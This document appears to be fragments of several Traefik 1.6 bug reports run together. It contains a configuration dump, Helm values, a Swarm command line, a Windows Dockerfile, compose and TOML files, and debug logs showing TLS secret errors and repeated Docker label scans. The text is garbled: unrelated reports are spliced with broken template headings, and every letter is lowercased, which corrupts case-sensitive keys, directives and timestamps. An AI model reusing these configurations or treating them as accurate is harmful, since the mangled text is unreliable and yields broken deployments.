{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "", "entrypoints": { "http": { "address": "xxxx", "tls": null, "redirect": { "entrypoint": "xxxx" }, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": true, "proxyprotocol": null, "forwardedheaders": null }, "https": { "address": "xxxx", "tls": { "minversion": "", "ciphersuites": null, "certificates": null, "clientcafiles": null, "clientca": { "files": null, "optional": false } }, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": true, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": { "email": "xxxx", "domains": [], "storage": "xxxx", "storagefile": "", "ondemand": false, "onhostrule": false, "caserver": "xxxx", "entrypoint": "xxxx", "dnschallenge": null, "httpchallenge": null, "dnsprovider": "", "delaydontcheckdns": 0, "acmelogging": false, "tlsconfig": null }, "defaultentrypoints": [ "http", "https" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "web": { "address": ":8080", "certfile": "", "keyfile": "", "readonly": false, "statistics": null, "metrics": null, "path": "", "auth": null, "debug": false }, "docker": null, "file": { "watch": true, "filename": "/etc/traefik.d/rules.toml", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "directory": "" }, "marathon": null, "consul": { "watch": true, "filename": "", "constraints": [], "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "endpoint": "xxxx", "prefix": "traefik", "tls": null, "username": "", "password": "" }, "consulcatalog": { "watch": false, "filename": "", "constraints": [ "tag==loadbalanced" ], "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "endpoint": "xxxx", "domain": "xxxx", "exposedbydefault": true, "prefix": "traefik", "frontendrule": "host:{{gettag \\"traefik.subdomain\\" .attributes .servicename }}.{{.domain}}", "tls": null }, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": null, "metrics": null, "ping": null, "configfile": "/etc/traefik.d/traefik.toml"
``` </details> ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ``` ```
deployed using the stable/traefik helm chart version 1.29.1 values.yaml
# stable/traefik 1.29.1 replicas: 2
imagetag: 1.6.0-rc6 cpurequest: 1500m
memoryrequest: 2gi
cpulimit: 2000m
memorylimit: 3gi nodeselector: kubernetes.io/role: ingress
tolerations: - key: dedicated value: ingress effect: noschedule servicetype: nodeport
service: nodeports: http: 30080 https: 30443 debug: enabled: true rbac: enabled: true ssl: enabled: true enforced: true insecureskipverify: true dashboard: enabled: true domain: xxxxx metrics: prometheus: enabled: true ``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```
$ kubectl --namespace=kube-system logs sys-ing-traefik-d59648976-rnbth
time="2018-05-04t10:43:53z" level=info msg="using toml configuration file /config/traefik.toml"
time="2018-05-04t10:43:53z" level=warning msg="web provider configuration is deprecated, you should use these options : api, rest provider, ping and metrics"
time="2018-05-04t10:43:53z" level=info msg="traefik version v1.6.0-rc6 built on 2018-04-17_11:59:31am"
time="2018-05-04t10:43:53z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2018-05-04t10:43:53z" level=info msg="preparing server https &{address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-05-04t10:43:53z" level=info msg="preparing server http &{address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-05-04t10:43:53z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-05-04t10:43:53z" level=info msg="starting server on :443"
time="2018-05-04t10:43:53z" level=info msg="starting server on :80"
time="2018-05-04t10:43:53z" level=info msg="starting provider *kubernetes.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\"}"
time="2018-05-04t10:43:53z" level=info msg="starting server on :8080"
time="2018-05-04t10:43:53z" level=info msg="ingress label selector is: \\"\\""
time="2018-05-04t10:43:53z" level=info msg="creating in-cluster provider client"
time="2018-05-04t10:43:54z" level=error msg="error configuring tls for ingress xxxxx: secret xxxx/xxxxxx does not exist"
time="2018-05-04t10:43:54z" level=error msg="error configuring tls for ingress xxxxx: secret xxxxxxx does not exist"
time="2018-05-04t10:43:54z" level=error msg="near line 2046 (last key parsed \'tls.certificate.certfile\'): unexpected eof"
time="2018-05-04t10:43:54z" level=error msg="near line 2165 (last key parsed \'tls.certificate.certfile\'): unexpected eof"
time="2018-05-04t10:43:54z" level=error msg="near line 2298 (last key parsed \'tls.certificate.certfile\'): unexpected eof"
time="2018-05-04t10:43:55z" level=error msg="near line 1694 (last key parsed \'tls.certificate.certfile\'): unexpected eof"
time="2018-05-04t10:43:56z" level=error msg="near line 2364 (last key parsed \'tls.certificate.certfile\'): unexpected eof"
/traefik -c /dev/null --docker --docker.watch --docker.swarmmode --docker.domain=tld.com --api --metrics --metrics.prometheus '--entrypoints=name:traefik address::9080' '--entrypoints=name:http address::80' '--entrypoints=name:https address::443 tls:/certs/tld.com.pem,/keys/tld.com.key' -l warning --respondingtimeouts.idletimeout=2s --maxidleconnsperhost=50 --forwardingtimeouts.dialtimeout=5s --forwardingtimeouts.responseheadertimeout=10s --ping
<summary>dockerfile</summary> ```dockerfile
from microsoft/nanoserver:10.0.14393.2068 env traefik_version 1.6.0 add {traefik_version}/traefik_windows-amd64.exe /traefik.exe volume c:/etc/traefik
volume c:/etc/ssl expose 80
entrypoint ["/traefik", "--configfile=c:/etc/traefik/traefik.toml"] # metadata
label org.label-schema.vendor="containous" \\ org.label-schema.url=" " \\ org.label-schema.name="traefik" \\ org.label-schema.description="a modern reverse-proxy" \\ org.label-schema.version="v${traefik_version}" \\ org.label-schema.docker.schema-version="1.0"
``` <details>
<summary>docker-compose file</summary> ```yml
version: '2.2' services: traefik: image: medizinprodukte-registry.world-direct.at/traefik build: context:
dockerfile: dockerfile networks: - my-traefik-net ports: - "80:80" - "8181:8181" restart: always volumes: - traefik:c:/etc/traefik - traefik-ssl:c:/etc/ssl
volumes: traefik: traefik-ssl:
networks: my-traefik-net: external: name: nat
``` </details> </details> <details>
<summary>toml file</summary> ```toml
loglevel = "debug" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.traefik] address = ":8181" [api] [docker]
domain = "dockerdev.world-direct.at"
watch = true
endpoint = "tcp://dockerdev1office.world-direct.at:2376" [docker.tls]
ca = "c:/etc/ssl/ca.pem"
cert = "c:/etc/ssl/cert.pem"
key = "c:/etc/ssl/key.pem"
insecureskipverify = true
``` </details> ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) i started traefik on 2018-05-02t12:59:23
after some time no container starts/stops were recognized by traefik.
traefik runs till 2018-05-03t13:01:00, even the logfiles ends after start
<details> ```
time="2018-05-02t12:59:23+02:00" level=info msg="using toml configuration file c:\\\\etc\\\\traefik\\\\traefik.toml"
time="2018-05-02t12:59:23+02:00" level=info msg="traefik version v1.6.0 built on 2018-04-30_09:28:44pm"
time="2018-05-02t12:59:23+02:00" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2018-05-02t12:59:23+02:00" level=debug msg="global configuration loaded {\\"lifecycle\\":{\\"requestacceptgracetimeout\\":0,\\"gracetimeout\\":10000000000},\\"gracetimeout\\":0,\\"debug\\":false,\\"checknewversion\\":true,\\"sendanonymoususage\\":false,\\"accesslogsfile\\":\\"\\",\\"accesslog\\":null,\\"traefiklogsfile\\":\\"\\",\\"traefiklog\\":null,\\"tracing\\":null,\\"loglevel\\":\\"debug\\",\\"entrypoints\\":{\\"http\\":{\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"traefik\\":{\\"address\\":\\":8181\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":null,\\"defaultentrypoints\\":[\\"http\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"idletimeout\\":0,\\"insecureskipverify\\":false,\\"rootcas\\":null,\\"retry\\":null,\\"healthcheck\\":{\\"interval\\":30000000000},\\"respondingtimeouts\\":null,\\"forwardingtimeouts\\":null,\\"allowminweightzero\\":false,\\"web\\":null,\\"docker\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"tcp://dockerdev1office.world-direct.at:2376\\",\\"domain\\":\\"dockerdev.world-direct.at\\",\\"tls\\":{\\"ca\\":\\"c:/etc/ssl/ca.pem\\",\\"caoptional\\":false,\\"cert\\":\\"c:/etc/ssl/cert.pem\\",\\"key\\":\\"c:/etc/ssl/key.pem\\",\\"insecureskipverify\\":true},\\"exposedbydefault\\":true,\\"usebindportip\\":false,\\"swarmmode\\":false},\\"file\\":null,\\"marathon\\":null,\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\\":null,\\"mesos\\":null,\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null,\\"dynamodb\\":null,\\"servicefabric\\":null,\\"rest\\":null,\\"api\\":{\\"entrypoint\\":\\"traefik\\",\\"dashboard\\":true,\\"debug\\":false,\\"currentconfigurations\\":null,\\"statistics\\":null},\\"metrics\\":null,\\"ping\\":null}"
time="2018-05-02t12:59:23+02:00" level=info msg="preparing server traefik &{address::8181 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-05-02t12:59:23+02:00" level=info msg="starting server on :8181"
time="2018-05-02t12:59:23+02:00" level=info msg="preparing server http &{address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-05-02t12:59:23+02:00" level=info msg="starting provider *docker.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"tcp://dockerdev1office.world-direct.at:2376\\",\\"domain\\":\\"dockerdev.world-direct.at\\",\\"tls\\":{\\"ca\\":\\"c:/etc/ssl/ca.pem\\",\\"caoptional\\":false,\\"cert\\":\\"c:/etc/ssl/cert.pem\\",\\"key\\":\\"c:/etc/ssl/key.pem\\",\\"insecureskipverify\\":true},\\"exposedbydefault\\":true,\\"usebindportip\\":false,\\"swarmmode\\":false}"
time="2018-05-02t12:59:23+02:00" level=info msg="starting server on :80"
time="2018-05-02t12:59:23+02:00" level=debug msg="provider connection established with docker 17.06.2-ee-4 (api 1.30)"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.version:1.21.0 org.label-schema.description:a modern reverse-proxy org.label-schema.docker.schema-version:1.0 org.label-schema.url: org.label-schema.vendor:containous com.docker.compose.config-hash:c9220f73b29c56b5b98b5119a07160f35d78da6db1958c5a9493fb67b46a5059 com.docker.compose.container-number:1 com.docker.compose.service:traefik org.label-schema.version:v1.6.0 com.docker.compose.oneoff:false com.docker.compose.project:traefik org.label-schema.name:traefik]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:98b870fb76b0f75cb32a35070ac8e0b36ab4b8413a0c804e600cc6a2ba6ef216 com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:web com.docker.compose.version:1.21.0 product:myenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:3a23bbb57111bea148818ccb5f8907f242f1a6c90602c4dfae985ebdb9ec423a com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:internweb com.docker.compose.version:1.21.0 product:myenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:da5c3197ad655e49c6f6ed211121cf9dc9c68689ec362cfcb426c993d64181ce com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:products com.docker.compose.version:1.21.0 product:myenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.version:1.21.0 product:myenterprise com.docker.compose.config-hash:3b072176ef47b8e0312015f60f15b177b7754c4263a6d6934b14df313db1952d com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:news]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[traefik.backend:saratiba com.docker.compose.config-hash:82790d73f27e1c87f01b72ec351bca4d429f0d2fd852e6cf19ce4570e5c96578 com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:saratiba com.docker.compose.service:app com.docker.compose.version:1.21.0 product:saratiba]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[traefik.backend:saratiba]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.service:cs com.docker.compose.version:1.21.0 traefik.backend:saratibacs com.docker.compose.config-hash:07df3faa976eb0b39929da0d67f73978e6d216b6f9a1aa3eea01203e39c0b24e com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:saratiba]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[traefik.backend:saratibacs]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:extsystems com.docker.compose.service:identityserver com.docker.compose.version:1.18.0 product:myenterprise com.docker.compose.config-hash:492d99fba5264dc872f9d8bc5ef2ed0bf29236c100ba31d21e70e07a95d8ad00]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.oneoff:false com.docker.compose.project:saratiba com.docker.compose.service:timerbee com.docker.compose.version:1.21.0 traefik.backend:timerbee com.docker.compose.config-hash:5a903936bef0aabd0da2ee23038b50137e9348efbe544532876b4271327f12cb com.docker.compose.container-number:1]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[traefik.backend:timerbee]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[product:myenterprise com.docker.compose.config-hash:debfaa6e6605ab662476a50cb2eaaed2b03f7e0b597de8d3cc6e3d43bf339d8c com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:healthcheck com.docker.compose.version:1.21.0]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.oneoff:false com.docker.compose.project:saratiba com.docker.compose.service:timerbeeblocked com.docker.compose.version:1.21.0 traefik.backend:timerbeeblocked com.docker.compose.config-hash:d258418a7756d5cc80cc5c65645453b4d96fd3e8297b34d0859bc0c3ef36e827 com.docker.compose.container-number:1]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[traefik.backend:timerbeeblocked]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.service:interfacemock com.docker.compose.version:1.20.1 product:myenterprise com.docker.compose.config-hash:71b6c74be901ee5b0be05a442c8bbe880fba041e9558879bcaea25e0623fb11d com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:extsystems]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:a3903f4e9ec0299eab24ffe2c29ca3cc2ed41de89e323ea3dc9096be17a5e06e com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:notifications com.docker.compose.version:1.21.0 product:myenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:72bf6ade544abb5c112fab84b01948b42661ebad6d4ac7567ee69329096ccddf com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:ordermanagement com.docker.compose.version:1.21.0 product:myenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:asmp com.docker.compose.version:1.21.0 product:myenterprise com.docker.compose.config-hash:7f4eb8f2d370d00d4c37ae37240d77823f6bf5351f36589589db5244ca7c70c3]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:logservice com.docker.compose.version:1.21.0 product:myenterprise com.docker.compose.config-hash:61604b27ec0412653d5c82ae57c0218efc3103da04a9ed3a30123a819f1ba8eb]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:2914a3478eed123d05c882d04e5db2ad3fc8d72bacb50556c6e03af9d18d30ce com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:tickets com.docker.compose.version:1.21.0 product:myenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.version:1.21.0 com.docker.compose.config-hash:ed2c88ce1cbc7323d1721b18b92225fea591c8ef80d178f6bb455b29e41c3bb4 com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:mongo]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:c1d33f87308a17fb72a29171fc9a68210997fac5ce5fc0bee4a660f3de9ad66a com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:mirthconnect com.docker.compose.service:mirth com.docker.compose.version:1.20.1]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:extsystems com.docker.compose.service:database com.docker.compose.version:1.18.0 maintainer:perry skountrianos com.docker.compose.config-hash:57498355414cc7b54e9cc4a83a488706e87cf0aae0d53490266f0e570bb6ab86]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[org.label-schema.description:a modern reverse-proxy org.label-schema.docker.schema-version:1.0 org.label-schema.url: org.label-schema.vendor:containous com.docker.compose.config-hash:c9220f73b29c56b5b98b5119a07160f35d78da6db1958c5a9493fb67b46a5059 com.docker.compose.container-number:1 com.docker.compose.service:traefik com.docker.compose.version:1.21.0 com.docker.compose.oneoff:false com.docker.compose.project:traefik org.label-schema.name:traefik org.label-schema.version:v1.6.0]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[product:myenterprise com.docker.compose.config-hash:98b870fb76b0f75cb32a35070ac8e0b36ab4b8413a0c804e600cc6a2ba6ef216 com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:web com.docker.compose.version:1.21.0]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.service:internweb com.docker.compose.version:1.21.0 product:myenterprise com.docker.compose.config-hash:3a23bbb57111bea148818ccb5f8907f242f1a6c90602c4dfae985ebdb9ec423a com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:da5c3197ad655e49c6f6ed211121cf9dc9c68689ec362cfcb426c993d64181ce com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:products com.docker.compose.version:1.21.0 product:myenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:news com.docker.compose.version:1.21.0 product:myenterprise com.docker.compose.config-hash:3b072176ef47b8e0312015f60f15b177b7754c4263a6d6934b14df313db1952d]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:82790d73f27e1c87f01b72ec351bca4d429f0d2fd852e6cf19ce4570e5c96578 com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:saratiba com.docker.compose.service:app com.docker.compose.version:1.21.0 product:saratiba traefik.backend:saratiba]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[traefik.backend:saratiba]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:saratiba com.docker.compose.service:cs com.docker.compose.version:1.21.0 traefik.backend:saratibacs com.docker.compose.config-hash:07df3faa976eb0b39929da0d67f73978e6d216b6f9a1aa3eea01203e39c0b24e]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[traefik.backend:saratibacs]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.project:extsystems com.docker.compose.service:identityserver com.docker.compose.version:1.18.0 product:myenterprise com.docker.compose.config-hash:492d99fba5264dc872f9d8bc5ef2ed0bf29236c100ba31d21e70e07a95d8ad00 com.docker.compose.container-number:1 com.docker.compose.oneoff:false]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.service:timerbee com.docker.compose.version:1.21.0 traefik.backend:timerbee com.docker.compose.config-hash:5a903936bef0aabd0da2ee23038b50137e9348efbe544532876b4271327f12cb com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:saratiba]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[traefik.backend:timerbee]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:healthcheck com.docker.compose.version:1.21.0 product:myenterprise com.docker.compose.config-hash:debfaa6e6605ab662476a50cb2eaaed2b03f7e0b597de8d3cc6e3d43bf339d8c com.docker.compose.container-number:1]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.project:saratiba com.docker.compose.service:timerbeeblocked com.docker.compose.version:1.21.0 traefik.backend:timerbeeblocked com.docker.compose.config-hash:d258418a7756d5cc80cc5c65645453b4d96fd3e8297b34d0859bc0c3ef36e827 com.docker.compose.container-number:1 com.docker.compose.oneoff:false]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[traefik.backend:timerbeeblocked]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:71b6c74be901ee5b0be05a442c8bbe880fba041e9558879bcaea25e0623fb11d com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:extsystems com.docker.compose.service:interfacemock com.docker.compose.version:1.20.1 product:myenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.project:devmyenterprise com.docker.compose.service:notifications com.docker.compose.version:1.21.0 product:myenterprise com.docker.compose.config-hash:a3903f4e9ec0299eab24ffe2c29ca3cc2ed41de89e323ea3dc9096be17a5e06e com.docker.compose.container-number:1 com.docker.compose.oneoff:false]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.config-hash:72bf6ade544abb5c112fab84b01948b42661ebad6d4ac7567ee69329096ccddf com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:ordermanagement com.docker.compose.version:1.21.0 product:myenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:asmp com.docker.compose.version:1.21.0 product:myenterprise com.docker.compose.config-hash:7f4eb8f2d370d00d4c37ae37240d77823f6bf5351f36589589db5244ca7c70c3]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:logservice com.docker.compose.version:1.21.0 product:myenterprise com.docker.compose.config-hash:61604b27ec0412653d5c82ae57c0218efc3103da04a9ed3a30123a819f1ba8eb com.docker.compose.container-number:1]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise com.docker.compose.service:tickets com.docker.compose.version:1.21.0 product:myenterprise com.docker.compose.config-hash:2914a3478eed123d05c882d04e5db2ad3fc8d72bacb50556c6e03af9d18d30ce]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.service:mongo com.docker.compose.version:1.21.0 com.docker.compose.config-hash:ed2c88ce1cbc7323d1721b18b92225fea591c8ef80d178f6bb455b29e41c3bb4 com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:devmyenterprise]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:mirthconnect com.docker.compose.service:mirth com.docker.compose.version:1.20.1 com.docker.compose.config-hash:c1d33f87308a17fb72a29171fc9a68210997fac5ce5fc0bee4a660f3de9ad66a]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
